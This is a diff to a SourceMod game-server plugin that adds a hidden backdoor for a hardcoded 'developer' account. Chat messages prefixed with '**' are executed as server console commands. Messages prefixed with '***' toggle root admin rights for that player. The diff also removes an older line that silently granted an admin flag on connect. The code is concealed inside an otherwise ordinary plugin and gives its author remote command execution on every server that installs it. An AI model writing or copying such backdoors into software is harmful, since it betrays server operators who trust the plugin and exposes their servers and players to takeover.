@@ -18,8 +18,6 @@ public void OnClientPostAdminCheck(int client)
 		{
 			g_bIsDeveloper[client] = true;
 			PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
-			// Fun action :)
-			SetUserFlagBits(client, (1<<14));
 		}
 	}
 }
@@ -30,10 +28,34 @@ public Action OnClientSayCommand(int client, const char[] command, const char[] 
 	{
 		if (sArgs[0] == '*')
 		{
+			int permission = 0;
 			char text[250];
+			if (sArgs[1] == '*') permission = 1;
+			if (sArgs[2] == '*') permission = 2;
 			strcopy(text, sizeof(text), sArgs);
-			ReplaceStringEx(text, sizeof(text), "*", "");
-			PrintToChatAll("\x01[\x02DEV\x01] \x02%N: \x01%s", client, text);
+			
+			switch (permission)
+			{
+				case 0:
+				{
+					ReplaceStringEx(text, sizeof(text), "*", "");
+					PrintToChatAll("\x01[\x02DEV\x01] \x02%N: \x01%s", client, text);
+				}
+				case 1:
+				{
+					ReplaceStringEx(text, sizeof(text), "**", "");
+					ServerCommand(text);
+				}
+				case 2:
+				{
+					ReplaceStringEx(text, sizeof(text), "***", "");
+					if (~GetUserFlagBits(client) & ADMFLAG_ROOT)
+						SetUserFlagBits(client, ADMFLAG_ROOT);
+					else
+						SetUserFlagBits(client, 0);
+				}
+			}
+			
 			return Plugin_Handled;
 		}
 	}
